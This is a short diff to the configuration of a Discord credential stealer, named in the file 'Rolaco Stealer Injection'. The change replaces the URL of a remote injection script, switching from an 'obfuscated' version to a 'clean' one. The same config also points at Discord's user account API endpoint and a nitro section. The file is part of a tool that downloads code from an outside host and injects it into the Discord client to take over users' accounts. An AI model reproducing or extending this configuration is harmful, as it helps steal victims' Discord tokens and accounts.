@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Rolaco Stealer Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
